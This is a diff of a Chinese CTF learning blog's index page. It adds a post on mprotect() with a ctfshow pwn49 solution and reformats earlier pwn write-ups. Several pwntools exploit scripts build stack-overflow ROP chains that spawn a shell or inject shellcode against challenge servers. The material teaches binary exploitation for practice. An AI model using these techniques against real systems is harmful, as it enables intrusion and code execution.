@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta property="og:type" content="website">
@@ -183,6 +183,135 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/24/mprotect%E5%87%BD%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="和方煜">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小小pwn">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/24/mprotect%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">mprotect函数</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-24 14:28:23 / 修改时间：20:52:27" itemprop="dateCreated datePublished" datetime="2025-01-24T14:28:23+08:00">2025-01-24</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一、mprotect-函数"><a href="#一、mprotect-函数" class="headerlink" title="一、mprotect() 函数"></a>一、<code>mprotect()</code> 函数</h1><h2 id="（1）mprotect-函数简介"><a href="#（1）mprotect-函数简介" class="headerlink" title="（1）mprotect() 函数简介"></a>（1）<code>mprotect()</code> 函数简介</h2><p>在二进制漏洞利用（Pwn）中，<code>mprotect()</code> 函数是一个非常重要的系统调用，它用于修改内存区域的访问权限。这在漏洞利用中很有用，例如当你想要在一段原本不可执行的内存区域中执行 shellcode 时，就可以使用 <code>mprotect()</code> 函数将该区域的权限修改为可执行。</p>
+<h2 id="（2）mprotect-函数的原型"><a href="#（2）mprotect-函数的原型" class="headerlink" title="（2）mprotect() 函数的原型"></a>（2）<code>mprotect()</code> 函数的原型</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数说明</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>addr</th>
+<th>len</th>
+<th>prot</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>修改权限的内存区域的起始地址，该地址必须是系统页大小（通常是 4096 字节）的整数倍</td>
+<td>修改权限的内存区域的长度，单位是字节</td>
+<td>指定新的内存访问权限</td>
+</tr>
+</tbody></table>
+<p><strong>内存访问权限：</strong></p>
+<table>
+<thead>
+<tr>
+<th>PROT_READ</th>
+<th>PROT_WRITE</th>
+<th>PROT_EXEC</th>
+<th>PROT_NONE</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>允许读取该内存区域</td>
+<td>允许写入该内存区域</td>
+<td>允许执行该内存区域中的代码</td>
+<td>禁止对该内存区域进行任何访问</td>
+</tr>
+</tbody></table>
+<p><strong>注：一般prot直接修改为7，即可读可写可执行</strong></p>
+<h1 id="二、例题ctfshow49"><a href="#二、例题ctfshow49" class="headerlink" title="二、例题ctfshow49"></a>二、例题ctfshow49</h1><h2 id="（1）思路"><a href="#（1）思路" class="headerlink" title="（1）思路"></a>（1）思路</h2><p>我们可以通过栈溢出调用mprotect() 函数，将bss段修改为可读可写可执行，通过read函数将shellcode写入bss段，最后将返回地址改为bss段就可以</p>
+<p>但是mprotect函数需要设置三个参数，我们要找到一个含有三个pop一个ret指令的地址，将原有的参数pop走，再写入新的参数</p>
+<p>我们使用ROPgadge命令找到三个连续的寄存器  ROPgadget –binary pwn  –only “pop|ret”</p>
+<p><img src="/2025/01/24/mprotect%E5%87%BD%E6%95%B0/image-20250124145243021.png" alt="image-20250124145243021"></p>
+<p>pop_ebx_esi_ebp_ret &#x3D; 0x08056194</p>
+<p>第一个参数：addr&#x3D;0x80d8000</p>
+<p>第二个参数：len&#x3D;0x1000</p>
+<p>第三个参数：port&#x3D;7</p>
+<p>同样read函数也需要设置三个参数</p>
+<p>在 C 语言里，<code>read</code> 函数的原型如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">ssize_t read(int fd, void *buf, size_t count);</span><br></pre></td></tr></table></figure>
+
+<p><strong>参数解释：</strong></p>
+<p>fd：文件描述符，用于指定从哪个文件或设备读取数据（0标准输入；1标准输出；2错误输出）</p>
+<p>buf：指向用于存储读取数据的缓冲区的指针</p>
+<p>count：期望读取的最大字节数</p>
+<p>第一个参数：fd&#x3D;0</p>
+<p>第二个参数：buf&#x3D;0x80d8000（bss段任意一个地址就可以）</p>
+<p>第三个参数：count&#x3D;0x1000</p>
+<h2 id="（2）exp"><a href="#（2）exp" class="headerlink" title="（2）exp"></a>（2）exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">context(os = &#x27;linux&#x27;, arch = &#x27;i386&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28134)</span><br><span class="line">mprotect= elf.sym[&#x27;mprotect&#x27;]</span><br><span class="line">read = elf.sym[&#x27;read&#x27;]</span><br><span class="line">pop_ebx_esi_ebp_ret = 0x08056194</span><br><span class="line">shellcode = asm(shellcraft.sh())               #生成shellcode</span><br><span class="line">addr=0x80d8000</span><br><span class="line">buf=0x80d8000</span><br><span class="line">len=0x1000</span><br><span class="line">port=7</span><br><span class="line">payload = b&#x27;a&#x27;*(0x12+0x4)+p32(mprotect)           #将返回地址设为mprotect</span><br><span class="line">payload += p32(pop_ebx_esi_ebp_ret)+p32(addr)+p32(len)+p32(port)   #设置mprotect的参数</span><br><span class="line">payload += p32(read)                              #将mprotect返回地址设为read</span><br><span class="line">payload +=p32(pop_ebx_esi_ebp_ret)+p32(0)+p32(buf)+p32(len)               #设置read的参数</span><br><span class="line">payload +=p32(buf)                               #将read的返回地址设为buf（也就是shellcode）</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(shellcode)                            #将shellcode写入bss</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/22/ctfshow/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -267,7 +396,7 @@
 <p>gets：0x08048420</p>
 <p>system：0x08048450</p>
 <p>exp：</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io = remote(<span class="hljs-string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="hljs-number">28119</span>)<br>buf2 = <span class="hljs-number">0x0804B060</span><br><span class="hljs-keyword">system</span> = <span class="hljs-number">0x08048450</span><br>gets = <span class="hljs-number">0x08048420</span><br>payload= b<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x6c</span>+<span class="hljs-number">0x4</span>)<br>payload += p32(gets)<br>payload += p32(<span class="hljs-keyword">system</span>)   #作为gets函数的返回地址，返回到<span class="hljs-keyword">system</span>函数中<br>payload += p32(buf2)     #作为gets函数的参数（发送的/bin/sh将会被写入buf2），也是<span class="hljs-keyword">system</span>函数的返回地址(是无效的)<br>payload += p32(buf2)     #<span class="hljs-keyword">system</span>函数的参数<br>io.sendline(payload)<br>io.sendline(b<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)</span><br><span class="line">buf2 = 0x0804B060</span><br><span class="line">system = 0x08048450</span><br><span class="line">gets = 0x08048420</span><br><span class="line">payload= b&#x27;a&#x27;*(0x6c+0x4)</span><br><span class="line">payload += p32(gets)</span><br><span class="line">payload += p32(system)   #作为gets函数的返回地址，返回到system函数中</span><br><span class="line">payload += p32(buf2)     #作为gets函数的参数（发送的/bin/sh将会被写入buf2），也是system函数的返回地址(是无效的)</span><br><span class="line">payload += p32(buf2)     #system函数的参数</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="pwn44"><a href="#pwn44" class="headerlink" title="pwn44"></a>pwn44</h1><p>这道题思路与pwn43一样只不过是64位的，传参方式不同</p>
 <p><img src="/2025/01/22/ctfshow/image-20250122215202212.png" alt="image-20250122215202212"></p>
@@ -275,7 +404,7 @@
 <p><img src="/2025/01/22/ctfshow/image-20250122215304195.png" alt="image-20250122215304195"></p>
 <p>system：0x0400520</p>
 <p>gets：0x0400530</p>
-<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs makefile">from pwn import*<br>io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28255)<br>buf2 = 0x602080<br>system = 0x0400520<br>gets = 0x0400530<br>ret = 0x00000000004004fe<br>rdi = 0x00000000004007f3<br>payload= b&#x27;a&#x27;*(0xa+0x8)<br>payload += p64(rdi)  <br>payload += p64(buf2)<br>payload += p64(gets)<br>payload += p64(rdi)<br>payload += p64(buf2)    <br>payload += p64(system)    <br>io.sendline(payload)<br>io.sendline(b<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28255)</span><br><span class="line">buf2 = 0x602080</span><br><span class="line">system = 0x0400520</span><br><span class="line">gets = 0x0400530</span><br><span class="line">ret = 0x00000000004004fe</span><br><span class="line">rdi = 0x00000000004007f3</span><br><span class="line">payload= b&#x27;a&#x27;*(0xa+0x8)</span><br><span class="line">payload += p64(rdi)  </span><br><span class="line">payload += p64(buf2)</span><br><span class="line">payload += p64(gets)</span><br><span class="line">payload += p64(rdi)</span><br><span class="line">payload += p64(buf2)    </span><br><span class="line">payload += p64(system)    </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="总结pwn33，34"><a href="#总结pwn33，34" class="headerlink" title="总结pwn33，34"></a>总结pwn33，34</h1><h2 id="（1）解题思路"><a href="#（1）解题思路" class="headerlink" title="（1）解题思路"></a>（1）解题思路</h2><p>当没有bin&#x2F;sh或者sh字符串时，但是bss存在未初始化的变量，我们可以调用gets，read等函数将&#x2F;bin&#x2F;sh字符串写入将其作为system的第一个参数，构造system(“&#x2F;bin&#x2F;sh”)</p>
 <h2 id="（2）64位与32位栈溢出后函数调用的不同"><a href="#（2）64位与32位栈溢出后函数调用的不同" class="headerlink" title="（2）64位与32位栈溢出后函数调用的不同"></a>（2）64位与32位栈溢出后函数调用的不同</h2><ol>
@@ -384,7 +513,7 @@
 <h1 id="二、-函数调用过程"><a href="#二、-函数调用过程" class="headerlink" title="二、 函数调用过程"></a>二、 函数调用过程</h1><h2 id="（1）参数传递的步骤"><a href="#（1）参数传递的步骤" class="headerlink" title="（1）参数传递的步骤"></a>（1）参数传递的步骤</h2><p><strong>1.逆序压栈</strong></p>
 <p>调用函数（caller）按照<strong>逆序</strong>将参数依次压入栈中。这意味着最后一个参数先被压入栈，第一个参数最后被压入栈。</p>
 <p>例如，调用函数 <code>callee(1，2，3)</code> 时，参数的压栈顺序是3，2，1</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">push <span class="hljs-number">3</span>    <span class="hljs-comment">; 第三个参数，实际是第一个一个压入栈</span><br>push <span class="hljs-number">2</span>    <span class="hljs-comment">; 第二个参数</span><br>push <span class="hljs-number">1</span>    <span class="hljs-comment">; 第一个参数，实际是最后一个压入栈</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 3    ; 第三个参数，实际是第一个一个压入栈</span><br><span class="line">push 2    ; 第二个参数</span><br><span class="line">push 1    ; 第一个参数，实际是最后一个压入栈</span><br></pre></td></tr></table></figure>
 
 <p><strong>2.参数保存</strong></p>
 <p>这些参数被压入栈后，会保存在调用函数（caller）的栈帧中。此时，调用函数的栈帧仍然包含这些参数</p>
@@ -393,12 +522,12 @@
 <h2 id="（2）栈帧的切换"><a href="#（2）栈帧的切换" class="headerlink" title="（2）栈帧的切换"></a>（2）栈帧的切换</h2><p>当被调用函数（callee）开始执行时，栈帧的切换过程如下：</p>
 <p><strong>1.保存返回地址</strong></p>
 <p>当调用函数使用 <code>call</code> 指令调用被调用函数时，<code>call</code> 指令会自动将调用函数的下一条指令的地址（即返回地址）压入栈中</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">call</span> callee  <span class="hljs-comment">; 调用 callee 函数</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call callee  ; 调用 callee 函数</span><br></pre></td></tr></table></figure>
 
 <p><strong>2.创建被调用函数的栈帧</strong></p>
 <p>被调用函数（callee）会创建自己的栈帧，包括保存的寄存器值（也就是调用函数的基地址）、局部变量等</p>
 <p>被调用函数会从栈中读取参数，并在自己的栈帧中使用这些参数</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">push</span> <span class="hljs-built_in">ebp</span>       <span class="hljs-comment">; 保存调用者的基地址</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ebp</span>, <span class="hljs-built_in">esp</span>   <span class="hljs-comment">; 建立被调用者的基地址</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push ebp       ; 保存调用者的基地址</span><br><span class="line">mov ebp, esp   ; 建立被调用者的基地址</span><br></pre></td></tr></table></figure>
 
 <p><strong>3.执行被调用函数</strong></p>
 <p>被调用函数执行其逻辑，操作局部变量和参数</p>
@@ -406,7 +535,7 @@
 <p><strong>4.清理栈帧</strong></p>
 <p>被调用函数执行完毕后，清理自己的栈帧，释放局部变量占用的空间</p>
 <p>返回地址从栈中弹出，存储到指令指针（IP&#x2F;EIP&#x2F;RIP）中，程序跳回调用函数的下一条指令</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">esp</span>, <span class="hljs-built_in">ebp</span>  <span class="hljs-comment">; 恢复栈指针到调用者调用时的位置，释放局部变量占用的空间</span><br><span class="hljs-keyword">pop</span> <span class="hljs-built_in">ebp</span>       <span class="hljs-comment">; 恢复调用者的基地址    </span><br><span class="hljs-keyword">ret</span>           <span class="hljs-comment">; 从栈中弹出返回地址并跳转到该地址</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp  ; 恢复栈指针到调用者调用时的位置，释放局部变量占用的空间</span><br><span class="line">pop ebp       ; 恢复调用者的基地址    </span><br><span class="line">ret           ; 从栈中弹出返回地址并跳转到该地址</span><br></pre></td></tr></table></figure>
 
 <p><strong>注：</strong></p>
 <p><strong>x86</strong></p>
@@ -504,17 +633,17 @@
 <p><img src="/2025/01/19/wp/image-20250119140127117.png" alt="image-20250119140127117"></p>
 <p>看懂了，本来nbytes是无符号的整型（size_t），而后面转换成了有符号的整型（int）发送-1，10绕过if，且unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值，使read函数能够栈溢出最后返回到后门的地址。</p>
 <p>exp</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import*<br><span class="hljs-attribute">r</span> = remote(&#x27;node4.anna.nssctf.cn&#x27;,<span class="hljs-number">28220</span>)<br><span class="hljs-attribute">p1</span> = b&#x27;-<span class="hljs-number">1</span>&#x27;<br><span class="hljs-attribute">r</span>.sendline(p1)<br><span class="hljs-attribute">p2</span> = b&#x27;a&#x27;*(<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x8)+p64(<span class="hljs-number">0</span>x0400726)<br><span class="hljs-attribute">r</span>.sendline(p2)<br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r = remote(&#x27;node4.anna.nssctf.cn&#x27;,28220)</span><br><span class="line">p1 = b&#x27;-1&#x27;</span><br><span class="line">r.sendline(p1)</span><br><span class="line">p2 = b&#x27;a&#x27;*(0x10+0x8)+p64(0x0400726)</span><br><span class="line">r.sendline(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="3-BJDCTF-2020-babystack"><a href="#3-BJDCTF-2020-babystack" class="headerlink" title="3.[BJDCTF 2020]babystack"></a>3.[BJDCTF 2020]babystack</h1><p><img src="/2025/01/19/wp/image-20250119140737788.png" alt="image-20250119140737788"></p>
 <p>这道题与上一道相似，但是少了if，更简单了，buf读入的数据长度由我们输入的nbytes来决定，这里可以栈溢出，先输入一个大于0x10字节，在进行溢出就可以。</p>
 <p>Exp</p>
-<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span>*<br><span class="hljs-variable">r</span> = <span class="hljs-function"><span class="hljs-title">remote</span>(<span class="hljs-string">&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;</span>)</span><br><span class="hljs-variable">p1</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;100&#x27;</span><br><span class="hljs-variable">r.sendline</span>(<span class="hljs-variable">p1</span>)<br><span class="hljs-variable">p2</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x10</span>+<span class="hljs-number">0</span><span class="hljs-variable">x8</span>)+<span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-number">0</span><span class="hljs-variable">x04006E6</span>)</span><br><span class="hljs-variable">r.sendline</span>(<span class="hljs-variable">p2</span>)<br><span class="hljs-variable">r.interactive</span>()<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">r = remote(&#x27; [node4.anna.nssctf.cn’,28343](http://node4.anna.nssctf.cn:28343/)&#x27;)</span><br><span class="line">p1 = b&#x27;100&#x27;</span><br><span class="line">r.sendline(p1)</span><br><span class="line">p2 = b&#x27;a&#x27;*(0x10+0x8)+p64(0x04006E6)</span><br><span class="line">r.sendline(p2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>也可以用上面一个exp因为unsigned int是无符号整型，遇到-1就会变成unsigned int的最大值</p>
 <h1 id="4-NISACTF-2022-ezstack"><a href="#4-NISACTF-2022-ezstack" class="headerlink" title="4.[NISACTF 2022]ezstack"></a>4.[NISACTF 2022]ezstack</h1><p>Checksec发现是32位的。NX保护开启</p>
 <p>Ida分析发现main函数，又发现shell函数发现read可以栈溢出，shift+f12发现system与&#x2F;bin&#x2F;sh，找到system的地址，与&#x2F;bin&#x2F;sh的地址编写exp</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>p = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>, 22397)<br><span class="hljs-attribute">sh_addr</span>=0x804a024<br><span class="hljs-attribute">system_plt</span>=0x8048390<br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*(0x48+0x4)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                #第一个p32(sh_addr)用于占位<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node5.anna.nssctf.cn&#x27;, 22397)</span><br><span class="line">sh_addr=0x804a024</span><br><span class="line">system_plt=0x8048390</span><br><span class="line">payload=b&#x27;a&#x27;*(0x48+0x4)+p32(system_plt)+p32(sh_addr)+p32(sh_addr)                #第一个p32(sh_addr)用于占位</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="5-GFCTF-2021-where-is-shell"><a href="#5-GFCTF-2021-where-is-shell" class="headerlink" title="5.[GFCTF 2021]where_is_shell"></a>5.[GFCTF 2021]where_is_shell</h1><p>Checksec发现保护开启，ida查看发现危险函数read，可以栈溢出，有system函数无&#x2F;bin&#x2F;sh，不会写，看了一下wp，虽然没有&#x2F;bin&#x2F;sh字符串，但是的汇编二进制代码里的24 30可以用来表示$0，而$0指代的就是”&#x2F;bin&#x2F;sh，</p>
 <p>&#x2F;bin&#x2F;sh的地址为<img src="/2025/01/19/wp/wps2.jpg" alt="img"></p>
@@ -524,7 +653,7 @@
 <p>还需要栈对齐需要</p>
 <p><img src="/2025/01/19/wp/wps5.jpg" alt="img"> </p>
 <p>Exp模板</p>
-<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">from</span> <span class="hljs-variable">pwn</span> <span class="hljs-variable">import</span>*<br><span class="hljs-variable">p</span> = <span class="hljs-variable">remote</span>（）<br><span class="hljs-variable">payload</span> = <span class="hljs-variable">b</span><span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0</span><span class="hljs-variable">x10</span> + <span class="hljs-number">8</span>) + <span class="hljs-function"><span class="hljs-title">p64</span>(<span class="hljs-variable">ret_addr</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">pop_rdi_addr</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">sh_addr</span>) + <span class="hljs-title">p64</span>(<span class="hljs-variable">sys_addr</span>)</span><br><span class="hljs-variable">p.sendline</span>(<span class="hljs-variable">payload</span>)<br><span class="hljs-variable">p.interactive</span>()<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p = remote（）</span><br><span class="line">payload = b&#x27;a&#x27;*(0x10 + 8) + p64(ret_addr) + p64(pop_rdi_addr) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2025/01/19/wp/wps6.jpg" alt="img"> </p>
